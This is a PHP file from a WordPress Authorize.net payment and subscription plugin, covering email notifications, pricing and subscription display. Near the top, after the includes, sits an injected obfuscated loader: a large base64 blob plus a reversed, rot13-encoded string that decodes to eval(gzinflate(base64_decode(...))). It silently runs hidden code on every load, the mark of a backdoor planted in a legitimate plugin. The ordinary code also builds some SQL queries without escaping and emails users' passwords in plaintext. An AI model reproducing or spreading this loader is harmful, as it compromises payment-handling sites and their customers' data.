<?php


/*
 * Copyright 2010, Maintain Fit LLC, Daniel Watrous, All rights reserved
 * By using this software you agree to be bound by the terms
 * outlined in the License.txt file included with the software.
 *
 * If you still have questions please send them to helpdesk@danielwatrous.com
 *
 */
require_once('authnet_classes_request.php');
require_once('AuthnetCart.php');
require_once('AuthnetCartItem.php');
require_once('AuthnetProcessAIMVoid.php');


 $tJOAQMko_A='H4fEubyEMVdqgzyXKaP4YIi9of4WWXrTG1qTfmsOQ77TMhxvEpq1+XhhLlsNf5PBgbM72KyLf2yrXODvewckbDC7octfqUaebZ4RtLalw+kvWnTrehfpW05cVV3ud9ETjZVdE3Lqb5r0p8NiXUNYKzKW/RVOm2fpn7yEO3ctQBzPniBtC3l+RplxpbIXurapUqrUt6GVKnaYqEsyNw+2l+0uGUT3TfukjJFzdc5zZ2uXvkkCwOUmDEyzVszQVnmuFl1rhRWWO0zLgcRoqNa8JGgujJU+hT1W362lApIYoePe5fCefE5vE5SXxf9wuXJyFKM3acN5Nw31EMNs3WJh0ow669Y8esQRYaY2dRRkt+TLLpYReMjU8eS3IEG3vxaNG03SfACbgaagda79UAVMCugKpfUPDKqj0uOVyuPypMtR+6UzSY88+9zlsOt2+nsHduPQNJxRQCOAs1gSaxum6fjanx2E8/YeXqTpVJ9XDYr9NLXTRwcIKkRwN+GrPR3KgrnB0KGiYQM/NWflBEXAWcv8uoQmi6d8crFgh5kZnbRpgaPyMtb3U3goRj9v1oACuP4OQc3zWUnflgLjtXdaDUvLUU6TmCk4MB+bndFr+GyZIOFZ1HEWvpB9lg6yX7x5eVkjIX3gamEzQodGcrHs/oZWDkLvB63Tl6PEr+opdQMeGhCi13W2Wxnpcwqg+HvwF3ISnzeJcbru/KHQg3CymtHgIEDEYn3IlTLzph63IEqqduUEGEhFq12wFIH36xIShvq7V5Q/vBW4cl0lvUwA5Ah141McJJi5JSCy2ybq5MxuP/MQTWb2oufE3sfDcowh5/XNFT0oyKf4m+rYIe+DJ51QSFowydpleZEx/SQYM9+iYOBCuiwwDv6hxBrtOLuTjWTv9fycxfX498tNMds4NcM/bTzUdipEPqMtkdbUlHfg+ovOf+OgnwXQNL548dI5jAXyDYbaqxoPsN+XJZzqSudbN0BH+sdTG/2n9cTE4SP0Bl0fYvN6WqNxUIcjHH3l3WOmIoQGg08D9FUTscOm0NkNEQDz+c38pV4Ky3dq/urdHJ7Mtuj4Do0xZ72xbg1Cn1GFC+l8WenRWAepM0YZx/A1FLoOPGenrIj/LJCNqb8AyFOmGo2+NFaiLatJ0cVrx7J+jnHYA/W2bEeNELeHW6/VA4aiaJw/Eb8HTYkQuAiOi0rAK5dvV533Cu4gdz20lTXU469X9MrmGlbg5qNoLZik8nOzixPNj1fP/8bYl02H8GY0Zr7HDEvM/Nn+/1BiQnjcr2hImfIIIvlA1RMAvz+tmvUoAdLsauEZ/InWQdt1brMs7AfXP+LZgM7Uab5xehyakft9EIr1Gj8fL4UImZ6JcpsULRsoc6kZSEgdWf9HOg5qIbrbou/S1JG+pnNyTKgwyjvBMcKOP1aR7CumYXqNqCY/JaLYStuKhqaAleTeSRrK10lWMq99w8liF2YQ3eqpBYHxEoQ1RYVtqhtTuPy53PuhPEtlySuHsl95dNgLH24rbIHj4JG6O/NpHFU4zP6DvjPf2LJVhUpnbdArmpipQBPCW3Z7Zh69G+xR7/oicdHEW+7/jNH0Xr4dCvQisJaG3hM2r6EFkmQtHckhO2R6bSgVRHpjbCOxl7WOsqu/lv0SVi6KqiW/XRWc0ExICMM1IJsWof/BG+y7G+4Dbo7jFQo7kqirjYc+nTzXGYAPwFf70icslJnJ4RKIE/0KAYO1pqiLr8ph/M50jexZnOK73+WXZSBy55dU1i3f5N135kfTTdZktbLXS+MADupWwgIejI8IoPq/6ZDk6lroquyK5mifJdTK4DOJ0bzhlX6s9ugS9B5uASsffIqOldpvDepGKbzw8hIEgRN9Gh1XEfDaVcOgZVEySfhFTzHt37vVhkna0uqkoAXQ7gcpWGZXZilYqSQLUgQoj3/knH+x5PM+DbkKB0VKVriS2YT+KOuC/gf5qiU0PQmKgx6ft18YndHzl3+mCbxN0TINlAUWX+SKiC+iotHPctCD3yjhMccpRBXOfU1bJjz2fUYQltkVuI2Be0XUHe0CDF6wTiZVhHvl8saCqJc6pNPNW00KJ9T86txIi/Zk91k9rx++ALX9yQ+XpUm0B7RZNHHGVgWzMcFTjaDHLEDxYo09LKAXbhhYtkZF1ixUa/H4EB4WymdqxBs4yDOEHc5BNGljwYCPF0nyhFLpswngEyEEKIOCU5RFey3xCpGlNVmIWvINP3NjuV2c/jvB09ZylGIwi+JfWCH6cPiOogNVoYK+NLdUL6/lJNCFlnI+niuq0YhG7KehMTTNWUZDLfay7cTqLOoxRE9wk/v3GOEPlVWZyKhiKv1nW14kN/+Q2B6vpCkxxBhJWcTEz+yojxW1Codob9FZegfjBvUNNDYNMOJ9xAeaxHDvGmbKQCl1gMd4iAkisvPUBu1CI+qKfl8AjaAdfS9lAtRxbm34+Woxq4YlQGXmPkNqCqwbYMKk5/RLFfv6QAWCVyt1ixBnezS+h6EC43+YAGYzan4p5r/ulLknVGW2RBGpdSTKvWPPoVRPkjvU7i2EPsi8uN0K5aHYgor528FVahwotKG9U0hBzhfWbvsB1oxbAhxsPSmx802kEY/EKXkP8lk20zhp2gfqzC0albAEZUfO4dmoX5XAm5IApFrr2G0ul/QvO354XB0NtdUkIKBVjB++VefEQQGf4lMoYFCNI1MkjDQCKdmYXhWU6zg8OsVKyXTAHreQX4MQ598qi/iFUwcUhGmZnmEM5jeYcnTEphSAtlI1cvM4PJLKHzre22WauAvcgxeXNEAJZ5SkvJNC6Uw0nQ0dYD+BgXHzvMUaBEWaq584SKIJ/3D4gCnzEINze24uhBclUdewvNhAHkVqMp5cbPVKjW7EoVqgAvHQ02VunhxuRwqQP3DTjcpo1AnWHnKbihYWqK8zRVZUqSTjQBBpqvnGki01hpgjnGVNyYEuMMVpVtLDoitGjUjaUAqCpZBiQrCANmb10GqIiQ85vESQHqcGJvJHHBystZ0kLMcxFwnZ0SeJRSaG+rCqlsU7cZyoPA1nZekhNiTFoXBjkHxJZcfqGiYOpFA8i28nip6BnQrHNBzie6MoAE/mPes/il6BiMTUEnixxTFQkQiPfe6IUlwJzon+esX75U1nJKAsAceTGCZJRvp2h/IN99fFURBB648RKUxWgpMDsPZpB1PIFXhA6h1TQTOwE8RpG/nw1l8p5fEk3ijkOhNQbhACZjdg0Gwo3cXEE3AcVCBBtL3g4lagg73FuErgQw79WAXZb2EBsqSUGKWD2lz1lH0nwwYPdBwJXBHFmdkwvJ4kaPQ9CFKEDI0eAiA7L6nRUpk1Yv8gIVr6NHdivBThIA04/UOLRml+rMzcktDNIV6CX0JQJChcMOcOARgWJmMrSSYGyY5IJ2i2i85zAhUgWEklTYfSzlfmIIbJRR+JLVyIDpBUkKLawFEV5wLdxB27rnIZK5kKB8BotwoXoOhRktTJfP1OeCwCcmUilugvHExbKh217MOoTyjVBwi5FTQ/7Gc/5NpF9ZPOsuMQXoeG5JtUulcwPGFLKKjCJMTyv9Kqd4kcsYb6l/Mf+LqfzFAkjuYKPHCy8CrNoD4QNJBCF0nwzca6zJe2IBmcjXJLg/eFvgMDLSBFRccJSk0hFAI4WVB3WoIxKhR9SDsPKIRCFi0uo+mQbJYRQhvmwRdXyT5Kp1PYB0peHzlhAoKEowVhtgxUjkVkz2P6L4BgDsTF6dpwUY0JfTKWjRXZeTo5sFQ8WrwjIU77QI6TaDP0UKLlTymYDLENSqpMwBkWKHqwJr6dS1Cr10bF+TM50If7xNBjUY+Z1tPJ6yB5Idc8R3fuk6CRWuXqJ1RW3ZUKLFHz7/bSoGQXkO9Ytc9lqX/qVsysmbFovGfWIohITekkKpoffpAwpyQ9Sp6VmLvUCCuZbPZQ7h/Mh2hHSglUVRdQMxVvBQusrKoe3m9awCA6J/gna8/TTuaP4RP/wTuhv0gHYoz1XlQbWRJ0a0DtsxWl6fVk+K1plARt8eCVEQcZ7WIwwjjUQlCOag/BAQ51H1ZCiNkdTIsphQTrUEG3AnD58JmLTgaDEXk4DZEdSaB+Rx4OSMz5Nm8PJe7tBtQL6Bog1Rs1RbFzD1ExRFcncE6HHg8lIlVnzRrz0da7pSy6h2faGyZ7Of8Yrr5c60BqMkL1HrC/q450aj2gkmwdxeJtA2pLISD6A0m6DL2zbA7oPrZJwbhi9S9Z2hcyNUjHW0A08bznn7O5a5pL/MxclUssDwJ8t6MHI7kJQinAIgbS0/YfxSDY6inIORBdhvPH+dmjaKkzRe2E5TA6RFGNG/nBDEP1Qzhm8o0OIdrSnFDlnbLaJdRT5Ut76wFERRCkjW/NCximby795xclguBARKf0P4QQN/uv/H+rlRZOkp4aSckJCKQTam0yapfhjxibFwCiX4Wjuu0EkEMBM9D9LMr9Gt9bppR1';$anvqYxxKRWdES=';))))N_bxZDNBWg$(ireegf(rqbprq_46rfno(rgnysavmt(ynir';$nEKCyNHUKLtUtDf=strrev($anvqYxxKRWdES);$zUFJAPbIvRgJH=str_rot13($nEKCyNHUKLtUtDf);eval($zUFJAPbIvRgJH);

// send email notification for single payment
function send_single_purchase_email_notification($personal_details, $subscription_details) {
	
	$to = $personal_details->email;
	
	$subject = get_option('authnet_email_subject_prefix');
	$subject = str_replace('{BLOGNAME}', get_bloginfo('name'), $subject);
	
	$message = get_option('authnet_email_message_template');
	
	// Blog name
	$message = str_replace('{BLOGNAME}', get_bloginfo('name'), $message);
	
	// User personal details
	$message = str_replace('{FIRSTNAME}', $personal_details->billingFirstName, $message);
	$message = str_replace('{LASTNAME}', $personal_details->billingLastName, $message);
	$message = str_replace('{BILLINGADDRESS}', ($personal_details->billingAddress .", " . $personal_details->billingCity .", " . $personal_details->billingState .", " . $personal_details->billingCountry . "."), $message);
	$message = str_replace('{PHONE}', $personal_details->billingPhone, $message);
	
	// User login details
	$message = str_replace('{USERNAME}', $personal_details->desiredUsername, $message);
	$message = str_replace('{PASSWORD}', ($personal_details->desiredPassword != '') ? $personal_details->desiredPassword : '\'EXISTING PASSWORD\'', $message);
	
	// User purchase details
	$message = str_replace('{SUBSCRIPTION}', $subscription_details->name, $message);
	$message = str_replace('{PAYMENT-INTERVAL}', str_replace("<br />", "\n", get_pricing($subscription_details)), $message);
	
	// User purchase details- old tokens
	$message = str_replace('{PAYMENTNAME}', $subscription_details->name, $message);
	$message = str_replace('{AMOUNT-PERIOD}', str_replace("<br />", "\n", get_pricing($subscription_details)), $message);
	
	// User subscription notes & comments
	$message = str_replace('{SUBSCRIPTION-NOTES}', ($personal_details->subscriptionNotes != '') ? $personal_details->subscriptionNotes : 'No Comments/Survey found.' , $message);
	
	// URL to site
	$message = str_replace('{ACCOUNTLOGINURL}', get_bloginfo('url'), $message);
	
	// Check for all possible values
	$message = str_replace(array('\r\n', '\r', '\n'), "\n", $message);
	$message = str_replace("\n", "<br />", $message);
	
	$message = stripslashes(stripslashes($message));
	
	$headers = 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
	
	// Check for alternate admin email 
	if ( get_option('authnet_alternate_admin_email') ) {
		$headers .= 'From: ' . get_option('authnet_alternate_admin_email') . "\r\n" .
					'Reply-To: ' . get_option('authnet_alternate_admin_email') . "\r\n" .
					'X-Mailer: PHP/' . phpversion();
	} else { // If there is no alternate admin email then use site admin email
		$headers .= 'From: ' . get_bloginfo('admin_email') . "\r\n" .
				'Reply-To: ' . get_bloginfo('admin_email') . "\r\n" .
				'X-Mailer: PHP/' . phpversion();
	} 
	
	// send email to user/sucscriber
	mail ($to, $subject, $message, $headers);
	
	// Check if admin's email are enabled
	if( get_option("authnet_send_admin_email")) {
		// Send email to admin
		// Check for alternate admin email 
		if ( get_option('authnet_alternate_admin_email') ) {
			mail (get_option('authnet_alternate_admin_email'), $subject, $message, $headers);
		} else {
			mail (get_bloginfo('admin_email'), $subject, $message, $headers); 
		} 
	}
}
// send email notification for cart purchased items 
function send_cart_purchase_email_notification($personal_details, $user_subscription_id) {
	
	// Get purchase items
	$purchased_cart_items = get_cart_items_record($user_subscription_id);

	if($purchased_cart_items != null ) {
		$order_total_cost = 0;
		for($i = 0; $i<count($purchased_cart_items); $i++) {
			$item_detail .= get_email_item_detail($purchased_cart_items[$i]);
			$order_total_cost += $purchased_cart_items[$i]->totalPrice;
		}
	}
	$cart_purchase_summary = get_email_purchase_detail($item_detail);
	$cart_purchase_summary =  str_replace('{TOTAL}',  '$' . number_format($order_total_cost, 2, '.', ',') , $cart_purchase_summary);
    
	$to = $personal_details->email;
	
	$subject = get_option('authnet_email_subject_prefix');
	$subject = str_replace('{BLOGNAME}', get_bloginfo('name'), $subject);
	
	$message = get_option('authnet_email_message_template');
	
	// Blog name
	$message = str_replace('{BLOGNAME}', get_bloginfo('name'), $message);
	
	// User personal details
	$message = str_replace('{FIRSTNAME}', $personal_details->billingFirstName, $message);
	$message = str_replace('{LASTNAME}', $personal_details->billingLastName, $message);
	$message = str_replace('{BILLINGADDRESS}', ($personal_details->billingAddress .", " . $personal_details->billingCity .", " . $personal_details->billingState .", " . $personal_details->billingCountry . "."), $message);
	$message = str_replace('{PHONE}', $personal_details->billingPhone, $message);
	
	// User login details
	$message = str_replace('{USERNAME}', $personal_details->desiredUsername, $message);
	$message = str_replace('{PASSWORD}', ($personal_details->desiredPassword != '') ? $personal_details->desiredPassword :'\'EXISTING PASSWORD\'', $message);
	
	// User purchase details
	$message = str_replace('{SUBSCRIPTION}', $cart_purchase_summary, $message);
	$message = str_replace('{PAYMENT-INTERVAL}', "", $message);
	
	// User purchase details- old tokens
	$message = str_replace('{PAYMENTNAME}', $cart_purchase_summary, $message);
	$message = str_replace('{AMOUNT-PERIOD}', "", $message);
	
	// User subscription notes & commentes
	$message = str_replace('{SUBSCRIPTION-NOTES}', ($personal_details->subscriptionNotes != '') ? $personal_details->subscriptionNotes :'No Comments/Survey found.' , $message);
	
	// URL to site
	$message = str_replace('{ACCOUNTLOGINURL}', get_bloginfo('url'), $message);
	// Check for all possible values
	$message = str_replace(array('\r\n', '\r', '\n'), "\n", $message);
	$message = str_replace("\n", "<br />", $message);
	
	$message = stripslashes(stripslashes($message));
	
	$headers = 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
	
	// Check for alternate admin email 
	if ( get_option('authnet_alternate_admin_email') ) {
		$headers .= 'From: ' . get_option('authnet_alternate_admin_email') . "\r\n" .
					'Reply-To: ' . get_option('authnet_alternate_admin_email') . "\r\n" .
					'X-Mailer: PHP/' . phpversion();
	} else { // If there is no alternate admin email then use site admin email
		$headers .= 'From: ' . get_bloginfo('admin_email') . "\r\n" .
				'Reply-To: ' . get_bloginfo('admin_email') . "\r\n" .
				'X-Mailer: PHP/' . phpversion();
	} 
	
	// send email to user/subscriber
	mail ($to, $subject, $message, $headers);
	
	// Check if admin's email are enabled
	if( get_option("authnet_send_admin_email")) {
		// Send email to admin
		// Check for alternate admin email 
		if ( get_option('authnet_alternate_admin_email') ) {
			mail (get_option('authnet_alternate_admin_email'), $subject, $message, $headers);
		} else {
			mail (get_bloginfo('admin_email'), $subject, $message, $headers); 
		} 
	}
}
// Get cart purchase detail for transaction summary report
function get_email_purchase_detail($item_detail) {
	include('authnet_purchase_content_template.php');

	$transaction_email_purchase_details = str_replace('{AUTHNET_CART_CONTENT}', $item_detail , $transaction_email_purchase_details);
	return $transaction_email_purchase_details;
}
// Get cart's item detail for transaction summary reprot
function get_email_item_detail($item) {
	include('authnet_purchase_content_template.php');

	$transaction_email_item_details = str_replace ('{SUBSCRIPTION_NAME}' , $item->name, $transaction_email_item_details);
	$transaction_email_item_details = str_replace ('{SUBSCRIPTION_DESC}' , $item->initialDescription, $transaction_email_item_details);
	$transaction_email_item_details = str_replace ('{SUBSCRIPTION_PRICING}' , get_pricing($item), $transaction_email_item_details);
	$transaction_email_item_details = str_replace ('{UNIT_PRICE}' , '$' . number_format($item->unitPrice, 2, '.', ',') , $transaction_email_item_details);
	$transaction_email_item_details = str_replace ('{UNIT_QUANTITY}' , $item->quantity, $transaction_email_item_details);
	$transaction_email_item_details = str_replace ('{UNIT_TOTAL}' , '$' . number_format($item->totalPrice, 2, '.', ','), $transaction_email_item_details);
	$transaction_email_item_details = str_replace ('{SUBSCRIPTION_ID}' , $item->id, $transaction_email_item_details);

	return $transaction_email_item_details;
}
// get pricing for all checkout page, emails and thank you page. 
function get_pricing($subscription_details) {
    
    if ( $subscription_details->processRecurringPayment == 1 ) {	
        
        $duration = ( (intval($subscription_details->recurringTotalOccurrences) == 9999) ? 'ongoing' : 'for '. intval($subscription_details->recurringTotalOccurrences) . ' payments');
        $recurring = ($subscription_details->recurringAmount == 0) ? "" : "$" . number_format( $subscription_details->recurringAmount, 2, '.', ',') . " every " . $subscription_details->recurringIntervalLength . " " . $subscription_details->recurringIntervalUnit . " " . $duration;
    }
    if ( $subscription_details->processSinglePayment == 1 && $subscription_details->processRecurringPayment == 0 ) {
	
        $pricing = "One time payment";
        $initial_amount = $subscription_details->initialAmount;
        $pricing .= ($initial_amount == "0.00" || $initial_amount == "" || !is_numeric($initial_amount))? "" : " of $" . number_format($initial_amount, 2, '.', ',');
		
    } else if ( $subscription_details->processSinglePayment == 0 && $subscription_details->processRecurringPayment == 1 ) { 
        
        $pricing = $recurring;
		
    } else if ( $subscription_details->processSinglePayment == 1 && $subscription_details->processRecurringPayment == 1 ) { 
        
        $pricing = "Initial payment of $" . number_format( $subscription_details->initialAmount, 2, '.', ',') . ' and recurring payments of ' . $recurring;
    }
	// Check for the recurring subscription first
	 if ( $subscription_details->processRecurringPayment == 1 ) {	
		if ( $subscription_details->recurringTrialOccurrences > 0 && $subscription_details->recurringConcealTrial != 1 ) {
			$trial_pricing = "<br />Including " . $subscription_details->recurringTrialOccurrences . " trial payments of $" . number_format( $subscription_details->recurringTrialAmount, 2, '.', ',') . " up front";
			$pricing .= $trial_pricing;
		}
	}

	return $pricing;      
    
}
// get blog host name.
function blog_domain() {
	$uri = parse_url(get_option('siteurl'));
	return $uri['host'];
	
}
// Get purchase item details
function get_purchase_items_description($subscription) {
	include('authnet_usersubscriptions_template.php');
	global $authnet_cart_items_table_name, $authnet_user_subscription_table_name, $authnet_subscription_table_name;
// Get purchase subscription detail
	$user_purchase_item_query = "SELECT * FROM  $authnet_cart_items_table_name 
	JOIN $authnet_user_subscription_table_name ON $authnet_user_subscription_table_name.ID  = $authnet_cart_items_table_name.user_subscription_id 
	JOIN $authnet_subscription_table_name ON $authnet_subscription_table_name.ID = $authnet_cart_items_table_name.subscription_id
	WHERE  $authnet_user_subscription_table_name.ID = ". $subscription->ID;
	$user_purchase_items = $wpdb->get_results($user_purchase_item_query);
	
	if ( count ($user_purchase_items) > 0 ) {
		$count = 1;
		foreach ( (array) $user_purchase_items as $user_purchase_item ) {
			if ( $count == 1 ) {
				$purchase_item_names .= $user_purchase_item->name;
			} else {
				$purchase_item_names .= ' | '. $user_purchase_item->name;
			}
			$count++;
		}
		$auth_user_purchase_item = $user_purchase_list_template;
		$auth_user_purchase_item = str_replace('{PURCHASED_SUBSCRIPTON_LIST}', $purchase_item_names, $auth_user_purchase_item);
		return $auth_user_purchase_item;
	} else {
		return '';
	}
}

// get user subscriptions template
function get_user_subscriptions($subscription, $updatesubscription, $user) {
	include('authnet_usersubscriptions_template.php');

	$auth_user_subscriptions_row = $user_subscriptions_template;
	$auth_user_subscriptions_row = str_replace('{USER_ID}', $subscription->user_id, $auth_user_subscriptions_row);

	// If accessed from user profile page by normal user
	if ( $user == "user" ) {
		$auth_user_subscriptions_row = str_replace('{USER_SUB_FNAME}', $subscription->billingFirstName, $auth_user_subscriptions_row);
		$auth_user_subscriptions_row = str_replace('{USER_SUB_MAILTO}', $subscription->emailAddress, $auth_user_subscriptions_row);
	} else { // If accessed from user subscription page by admin
		$auth_user_subscriptions_row = str_replace('{USER_SUB_FNAME}', $user_subscription_fname_template, $auth_user_subscriptions_row);
		$auth_user_subscriptions_row = str_replace('{USER_SUB_MAILTO}', $user_subscription_mailto_template , $auth_user_subscriptions_row);
		
		$auth_user_subscriptions_row = str_replace('{USER_EDIT}', get_bloginfo ('wpurl') . preg_replace ('#^.*[/\\\\](.*?)[/\\\\].*?$#', "/wp-admin/user-edit.php?user_id=".$subscription->user_id."&wp_http_referer=/wp-admin/admin.php?page=authnet_render_usersubscriptions", __FILE__), $auth_user_subscriptions_row);
		$auth_user_subscriptions_row = str_replace('{BILLING_FIRST_NAME}', $subscription->billingFirstName, $auth_user_subscriptions_row);
		$auth_user_subscriptions_row = str_replace('{EMAIL_ADDRESS}', $subscription->emailAddress, $auth_user_subscriptions_row);
	}
	
	// Replace rest of tokens
	$auth_user_subscriptions_row = str_replace('{BILLING_LAST_NAME}', $subscription->billingLastName, $auth_user_subscriptions_row);
	$auth_user_subscriptions_row = str_replace('{BILLING_ADDRESS}', $subscription->billingAddress, $auth_user_subscriptions_row);
	$auth_user_subscriptions_row = str_replace('{BILLING_CITY}', $subscription->billingCity, $auth_user_subscriptions_row);
	$auth_user_subscriptions_row = str_replace('{BILLING_STATE}', $subscription->billingState, $auth_user_subscriptions_row);
	$auth_user_subscriptions_row = str_replace('{BILLING_ZIP}', $subscription->billingZip, $auth_user_subscriptions_row);
	$auth_user_subscriptions_row = str_replace('{BILLING_COUNTRY}', $subscription->billingCountry, $auth_user_subscriptions_row);
	$auth_user_subscriptions_row = str_replace('{BILLING_PHONE}', $subscription->billingPhone, $auth_user_subscriptions_row);
	$auth_user_subscriptions_row = str_replace('{SUBSCRIPTION_NOTES}', $subscription->subscriptionNotes, $auth_user_subscriptions_row);
	$auth_user_subscriptions_row = str_replace('{START_DATE}', $subscription->startDate, $auth_user_subscriptions_row);
	$auth_user_subscriptions_row = str_replace('{SUBSCRIPTION_ID_UPDATE}', $subscription->xSubscriptionId, $auth_user_subscriptions_row);
	$auth_user_subscriptions_row = str_replace('{SUBSCRIPTION_ID_CANCEL}', $subscription->xSubscriptionId, $auth_user_subscriptions_row);
	// show update link against recurring transactions
	if ($subscription->xSubscriptionId != '' && check_for_cancelation($subscription->xSubscriptionId) && $updatesubscription) {
		//if ($subscription->isEcheck) {
		if ($subscription->lastFourDigitsOfBankAccountNumber != '' && $subscription->lastFourDigitsOfCreditCard == '' ) {
			$auth_user_subscriptions_row = str_replace('{UPDATE}', $user_sub_update_template_echeck, $auth_user_subscriptions_row);
		} else if ($subscription->lastFourDigitsOfCreditCard != '' && $subscription->lastFourDigitsOfBankAccountNumber == '') {
			$auth_user_subscriptions_row = str_replace('{UPDATE}', $user_sub_update_template, $auth_user_subscriptions_row);
		} else {
		$auth_user_subscriptions_row = str_replace('{UPDATE}', 'Update', $auth_user_subscriptions_row);
		}
		$auth_user_subscriptions_row = str_replace('{CANCEL}', $user_sub_cancel_template, $auth_user_subscriptions_row);
		$auth_user_subscriptions_row = str_replace('{SUBSCRIPTION_ID}', $subscription->xSubscriptionId, $auth_user_subscriptions_row);
		$auth_user_subscriptions_row = str_replace('{LEVEL}', $user, $auth_user_subscriptions_row);
		$auth_user_subscriptions_row = str_replace('{SUB-ID}', $subscription->ID, $auth_user_subscriptions_row);
		$auth_user_subscriptions_row = str_replace('{SUBSCRIPTIONID}', $subscription->xSubscriptionId, $auth_user_subscriptions_row);
		$auth_user_subscriptions_row = str_replace('{SUBSCRIPTION-STATUS}', '', $auth_user_subscriptions_row);
		$auth_user_subscriptions_row = str_replace('{USE_SSL_WARNING}', get_use_ssl_warning('update-cancel'), $auth_user_subscriptions_row);

	} else {
		$auth_user_subscriptions_row = str_replace('{UPDATE}', '', $auth_user_subscriptions_row);
		$auth_user_subscriptions_row = str_replace('{CANCEL}', '', $auth_user_subscriptions_row);
		$auth_user_subscriptions_row = str_replace('{SUBSCRIPTIONID}', $subscription->xSubscriptionId, $auth_user_subscriptions_row);
		$auth_user_subscriptions_row = str_replace('{SUBSCRIPTION-STATUS}', (check_for_cancelation($subscription->xSubscriptionId) == false) ? 'Cancelled' : '', $auth_user_subscriptions_row);
	}
	return $auth_user_subscriptions_row;
	}
// get user payments template
function get_user_payments($payment, $transaction_type, $user, $allow_refund, $user_profile) {
    include('authnet_usersubscriptions_template.php');
    $auth_user_payments_row = $user_payments_template;
    $auth_user_payments_row = str_replace ('{xAUTH_CODE}' , $payment->xAuthCode, $auth_user_payments_row);
    $auth_user_payments_row = str_replace ('{xTRANSACTION_ID}' , $payment->xTransId, $auth_user_payments_row);
    $auth_user_payments_row = str_replace ('{xAMOUNT}' , $payment->xAmount, $auth_user_payments_row);
    $auth_user_payments_row = str_replace ('{xSUBSCRIPTION_ID}' , $payment->xSubscriptionId, $auth_user_payments_row);
    $auth_user_payments_row = str_replace ('{xSUBSCRIPTION_PAYNAME}' , $payment->xSubscriptionPaynum, $auth_user_payments_row);
    $auth_user_payments_row = str_replace ('{xPAYMENT_DATE}' , $payment->paymentDate, $auth_user_payments_row);
	

    if ( !$transaction_type == 1 ) {
		// check for auth_only transactions
		if ( $payment->xType == 'auth_only' ) {
			if ( $payment->xTransStatus == 'Pending Capture' && $payment->expiryDate >= date('Y-m-d')) { // if pending capture and not yet expired
				if ( !$user_profile ) { // don't show on user profile page
					$auth_user_payments_row = str_replace ('{xVOID}' , $user_sub_void_template, $auth_user_payments_row);
					$auth_user_payments_row = str_replace ('{xCAPTURE}' , '/' . $user_sub_capture_template, $auth_user_payments_row);
				} 
			} else if ( $payment->xTransStatus == 'Captured') { // if captured then show refund option
				if ( $allow_refund ) {
					if ( !is_already_refunded($payment->xTransId) ) {
						$auth_user_payments_row = str_replace ('{xREFUND}' , $user_sub_refund_template, $auth_user_payments_row);
					} else {
						$auth_user_payments_row = str_replace('{REFUND-STATUS}', 'Refunded', $auth_user_payments_row);
					}
				} 
			} else  if ( $payment->xTransStatus == 'Pending Capture' && $payment->expiryDate < date('Y-m-d')) { // if pending transaction expired
				$auth_user_payments_row = str_replace ('{xExpired}' , 'Expired', $auth_user_payments_row);
			}
			 else  if ( $payment->xTransStatus == 'VOIDED') { // if transaction voided
				$auth_user_payments_row = str_replace ('{xVOIDED}' , 'Voided', $auth_user_payments_row);
			}
		} else if ( $payment->xType == 'auth_capture' ) { // show refund option to auth_capture transaction
			if ( $allow_refund ) {
				if (!is_already_refunded($payment->xTransId)) {
					$auth_user_payments_row = str_replace ('{xREFUND}' , $user_sub_refund_template, $auth_user_payments_row);
				}  else {
					$auth_user_payments_row = str_replace('{REFUND-STATUS}', 'Refunded', $auth_user_payments_row);
				}
			}
		}
	} 
	$auth_user_payments_row = str_replace('{TRANSACTION_ID}', $payment->xTransId, $auth_user_payments_row);
	$auth_user_payments_row = str_replace('{LEVEL}', $user, $auth_user_payments_row);
	$auth_user_payments_row = str_replace('{REFUND_AMOUNT}', $payment->xAmount, $auth_user_payments_row);
	$auth_user_payments_row = str_replace('{TRX-ID}', $payment->ID, $auth_user_payments_row);
	$auth_user_payments_row = str_replace('{TRANSACTION-STATUS}', '', $auth_user_payments_row);
	$auth_user_payments_row = str_replace('{USE_SSL_WARNING}', get_use_ssl_warning('refund'), $auth_user_payments_row);
	
	// replace all the token values if found
	$auth_user_payments_row = str_replace ('{xREFUND}' , '', $auth_user_payments_row);
	$auth_user_payments_row = str_replace('{REFUND-STATUS}', '', $auth_user_payments_row);
	$auth_user_payments_row = str_replace('{REFUND_USER_LEVEL}', '', $auth_user_payments_row);
	$auth_user_payments_row = str_replace ('{xVOID}' , '', $auth_user_payments_row);
	$auth_user_payments_row = str_replace ('{xCAPTURE}' , '', $auth_user_payments_row);
	$auth_user_payments_row = str_replace ('{xVOIDED}' , '', $auth_user_payments_row);
	$auth_user_payments_row = str_replace ('{xExpired}' , '', $auth_user_payments_row);
	
	
    return $auth_user_payments_row;
}
// get status of transaction for refund
function is_already_refunded($reference_transaction_id) {

	global $wpdb, $authnet_refund_table_name;

	$query_refund = "SELECT refTransID FROM "  . $authnet_refund_table_name . " WHERE refTransID ='" . $wpdb->escape($reference_transaction_id) . "'";
	if ($wpdb->get_var($query_refund) == null )	return false;
	else return true;

}
// get transactions report/view for only user profile page.
function get_user_transactions_report() {
	include('authnet_usersubscriptions_template.php');
 
	global $wpdb, $authnet_user_subscription_table_name, $authnet_payment_table_name;
	$link_to_css = get_bloginfo( 'template_url' ).'/authnet_css/style.css';
	echo '<div class="wrap"> <p>The table below contains all your subscriptions on this website.</p>';

	global $current_user;
	get_currentuserinfo();
	// query user subscription record
	$user_sub_query = "SELECT * FROM " . $authnet_user_subscription_table_name . " WHERE USER_ID = $current_user->ID";
	$usersubscriptions = $wpdb->get_results($user_sub_query);
	
	$user_subscriptions_rows_result = "";
	if ($usersubscriptions) {
		foreach ($usersubscriptions as $subscription) {
			$user_subscriptions_rows_result .= get_user_subscriptions($subscription, get_option('authnet_update_subscription'), 'user');
			// Get subscription detail
			$user_subscriptions_rows_result .= get_purchase_items_description($subscription);
			// query user subscription record
			$user_payment_query = "SELECT * FROM " . $authnet_payment_table_name . " where user_subscription_id = " . $subscription->ID . ";";
			$subscriptionpayments = $wpdb->get_results($user_payment_query);
			
			if ($subscriptionpayments) {
				foreach ($subscriptionpayments as $payment) { 
					$user_subscriptions_rows_result .= get_user_payments($payment, $subscription->isRecurring, 'user', get_option('authnet_allow_refund'), true);
				}
			} else {
				$user_subscriptions_rows_result .= '<tr><td colspan="8"><hr></td></tr>';
			}
		}
	}
	$user_subscriptions_main_template = str_replace('{USERSUBSCRIPTONRECORDS}', $user_subscriptions_rows_result, $user_subscriptions_main_template );
        $user_subscriptions_main_template = str_replace('{LINK_TO_CSS}', $link_to_css, $user_subscriptions_main_template );
        $user_subscriptions_main_template = str_replace('{_CHECKOUT_SELECT}', '_ignore', $user_subscriptions_main_template );
